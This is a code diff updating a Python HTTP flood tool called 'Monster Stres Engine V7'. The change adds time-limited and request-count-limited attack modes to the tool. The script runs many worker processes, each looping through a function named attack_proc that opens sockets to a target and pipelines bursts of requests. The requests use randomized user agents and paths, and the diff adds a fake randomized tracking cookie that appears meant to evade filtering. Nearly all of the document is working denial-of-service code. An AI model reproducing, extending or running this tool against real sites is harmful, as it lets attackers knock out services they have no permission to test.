@@ -6,8 +6,8 @@ import string
 import socket
 import ssl
 
-# Monster Stres Engine V7 (WRK-Style) - Debug Edition
-# Fixed for Windows/Linux Cross-Platform Robustness
+# Monster Stres Engine V7 (WRK-Style) - Dual Limit Edition
+# Supported: Time-limit (Flood) and Request-limit (Visitors)
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
@@ -17,19 +17,23 @@ USER_AGENTS = [
 def get_random_string(length=8):
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
 
-def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err):
+def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err, limit_type, limit_val):
     from urllib.parse import urlparse
     try:
         parsed = urlparse(target_url)
         host = parsed.netloc
         path = parsed.path if parsed.path else "/"
         scheme = parsed.scheme
-    except Exception as e:
+    except:
         host, path, scheme = target_url, "/", "http"
 
     target_port = int(port) if port else (443 if scheme == 'https' else 80)
     
-    while time.time() < end_time:
+    while True:
+        # CHECK LIMITS
+        if limit_type == 'time' and time.time() >= end_time: break
+        if limit_type == 'req' and shared_req.value >= limit_val: break
+
         s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -45,8 +49,10 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
             s.connect((host, target_port))
             s.settimeout(1)
 
+            # PIPELINING LOOP
             for _ in range(50):
-                if time.time() >= end_time: break
+                if limit_type == 'time' and time.time() >= end_time: break
+                if limit_type == 'req' and shared_req.value >= limit_val: break
                 
                 curr_path = path
                 if mode in ['3', '4']:
@@ -65,6 +71,7 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
                     f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                     "Connection: keep-alive\r\n"
                     "Accept-Encoding: gzip\r\n"
+                    f"Cookie: _ga={random.randint(1,9999)}\r\n"
                 )
                 
                 if method == "POST":
@@ -78,7 +85,6 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
                 with shared_req.get_lock(): shared_req.value += 1
                 with shared_bytes.get_lock(): shared_bytes.value += len(payload)
 
-                # Safe Recv (Discard)
                 try:
                     data = s.recv(1024)
                     if not data: break
@@ -88,54 +94,60 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
 
         except Exception:
             with shared_err.get_lock(): shared_err.value += 1
-            time.sleep(0.5) # Prevent CPU spin on constant error
+            time.sleep(0.1)
         finally:
             if s:
                 try: s.close()
                 except: pass
 
 def main():
-    if len(sys.argv) < 6:
-        print("[!] Missing arguments. Expected 5, got", len(sys.argv)-1)
+    if len(sys.argv) < 7:
         sys.exit(1)
 
-    url, th_count, duration, port, mode = sys.argv[1:6]
-    print(f"[*] Engine Initialized. Target: {url}, Workers: {th_count}")
-    sys.stdout.flush()
-
-    try:
-        th_count = int(th_count)
-        duration = int(duration)
-    except:
-        print("[!] Invalid thread/duration format.")
-        sys.exit(1)
+    url, th_count, limit_val, port, mode, limit_type = sys.argv[1:7]
+    th_count = int(th_count)
+    limit_val = int(limit_val)
 
     shared_req = multiprocessing.Value('i', 0)
     shared_bytes = multiprocessing.Value('Q', 0)
     shared_err = multiprocessing.Value('i', 0)
 
-    end_time = time.time() + duration
-    processes = []
+    # If time based, set end_time. If req based, end_time is far in future.
+    end_time = time.time() + limit_val if limit_type == 'time' else time.time() + 86400 # 24h safety
     
-    for i in range(th_count):
-        p = multiprocessing.Process(target=attack_proc, args=(url, end_time, port, mode, shared_req, shared_bytes, shared_err))
+    print(f"[*] Engine Active | Mode: {limit_type.upper()} LIMIT")
+    print(f"[*] Target: {url} | Workers: {th_count}")
+    sys.stdout.flush()
+
+    processes = []
+    for _ in range(th_count):
+        p = multiprocessing.Process(target=attack_proc, args=(url, end_time, port, mode, shared_req, shared_bytes, shared_err, limit_type, limit_val))
         p.daemon = True
         p.start()
         processes.append(p)
 
-    print(f"[*] {len(processes)} Processes running.")
-    sys.stdout.flush()
-
     start_time = time.time()
     last_bytes = 0
     try:
-        while time.time() < end_time:
+        while True:
+            # TERMINATION CHECK
+            if limit_type == 'time' and time.time() >= end_time: break
+            if limit_type == 'req' and shared_req.value >= limit_val: break
+            
             time.sleep(1)
             elapsed = int(time.time() - start_time)
             curr_bytes = shared_bytes.value
             mbps = ((curr_bytes - last_bytes) * 8) / (1024 * 1024)
             last_bytes = curr_bytes
-            print(f"PROGRESS:{elapsed}:{duration} | REQ: {shared_req.value} | THROUGHPUT: {mbps:.2f} Mbps | ERRORS: {shared_err.value}")
+            
+            progress = ""
+            if limit_type == 'time':
+                progress = f"{elapsed}:{limit_val}"
+            else:
+                perc = min(100, int((shared_req.value / limit_val) * 100))
+                progress = f"{perc}:100"
+
+            print(f"PROGRESS:{progress} | REQ: {shared_req.value} | THROUGHPUT: {mbps:.2f} Mbps | ERRORS: {shared_err.value}")
             sys.stdout.flush()
     except KeyboardInterrupt:
         pass
